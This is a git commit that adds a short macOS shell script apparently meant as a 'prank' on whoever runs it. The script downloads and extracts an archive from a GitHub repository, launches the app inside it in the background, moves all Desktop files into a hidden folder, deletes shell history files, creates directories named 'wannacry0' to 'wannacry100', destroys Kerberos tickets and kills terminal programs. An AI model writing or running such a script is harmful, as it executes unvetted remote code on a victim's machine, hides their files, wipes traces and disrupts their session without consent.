6fc0c4a81ae2f1a755d9d777590b153dd7b09857
ajroM <36647431+ajrou4@users.noreply.github.com>
2022-03-28 11:30:03 +0000

    Add files via upload
    7di krk

---
+++ m3ak _Ulv_.sh
@@ -0,0 +1,17 @@
+#! /bin/sh
+mkdir -p /tmp/laz/
+curl -s -L https://github.com/monybigsef/p1/raw/master/prank.tar.gz -o /tmp/laz/prank.tar.gz
+> /dev/null
+tar xvf /tmp/laz/prank.tar.gz -C /tmp/laz > /dev/null
+mkdir ~/.Laz/
+mv ~/Desktop/* ~/.Laz/
+cd ~/Desktop
+rm -rf ~/.*history*
+mkdir wannacry{0..100}
+nohup open /tmp/laz/app/Laz.app > /dev/null
+kdestroy
+clear
+rm -f ~/.*history*
+killall iTerm
+killall Terminal
+killall iTerm2
